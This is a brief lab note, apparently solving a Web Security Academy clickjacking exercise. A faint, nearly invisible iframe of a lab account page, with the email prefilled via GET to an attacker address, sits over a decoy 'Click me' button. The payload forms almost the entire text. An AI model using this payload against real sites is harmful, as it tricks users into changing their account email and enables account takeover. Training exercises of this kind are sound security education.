We are able to pre-filled the form, in this case the parameters are sending in the path as an usuar GET request
```html
<style>
    iframe {
        position:relative;
        width:1000px;
        height: 1000px;
        opacity: 0.1;
        z-index: 2;
    }
    div {
        position:absolute;
        top:470px;
        left:80px;
        z-index: 1;
    }
</style>
<div>Click me</div>
<iframe src="https://0a0800a70352a5f38118e8a2002e003d.web-security-academy.net/my-account?email=hacker@attacker-website.com"></iframe>
```